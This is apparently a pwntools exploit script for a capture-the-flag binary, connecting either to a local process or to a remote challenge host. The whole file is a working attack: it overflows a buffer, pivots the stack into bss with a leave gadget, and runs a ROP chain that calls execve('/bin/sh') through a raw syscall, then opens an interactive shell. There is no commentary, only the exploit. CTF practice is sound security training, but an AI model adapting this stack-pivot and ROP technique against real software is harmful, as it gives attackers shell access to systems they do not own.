from pwn import *

leave = 0x4012a8
ret = 0x40101a
pop_rdi = 0x401233
pop_rsi = 0x401235
pop_rdx = 0x401237
pop_rax = 0x401231
syscall = 0x401239
bss = 0x4040a0
stack_sz = 64

if args.LOCAL:
	p = process('./chall')
else:
	host = 'gc1.eng.run'
	port = 30216
	p = remote(host, port)
	
payload = b'/bin/sh\x00'
payload += b'A' * (stack_sz - 16 - len(payload))
payload += p64(bss + stack_sz)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

payload += b'A' * (255 - len(payload))
p.sendafter(b'\n>', payload)

payload = b'A' * 32
payload += p64(bss + stack_sz - 16)
payload += p64(leave)
p.sendafter(b'\n>', payload)

p.interactive()
p.close()